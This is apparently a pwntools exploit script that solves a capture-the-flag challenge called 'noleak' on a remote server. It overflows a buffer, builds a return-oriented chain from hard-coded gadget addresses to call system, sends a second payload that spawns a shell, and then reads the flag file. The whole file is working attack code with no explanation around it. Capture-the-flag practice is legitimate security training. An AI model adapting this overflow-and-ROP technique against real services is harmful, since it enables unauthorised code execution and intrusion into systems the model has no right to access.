import sys
from pwn import *

context.log_level = 'debug'
#p = process("./noleak_a67768f452505a3e8fd4da4454e1a6539876e116")
p = remote("noleak.eatpwnnosleep.com", 7777)

p.send("1\n")
p.recvuntil("me bytes\n")

pop_rdi = 0x400E63
system = 0x400880
libc_start_main = 0x400964

p.send("A"*(149 - 47) + "CCCC" + "B"*8 + "C" * 6  + (p64(pop_rdi) + p64(system) + p64(libc_start_main)).ljust(29) + "\n")

p.send("3\n")
p.recvuntil(" from now!\n")

payload = ("a"*(0x70-0x14) + p8(0x70 - 1 + 8) + "A" * 8 + "QQQQQQQQQQQQQQ" + "sh;").ljust(116)
p.send(payload + "\n")
p.send("cat flag_166903c90eadca6ffac515cd8a6787f2>&0\n")
p.interactive()
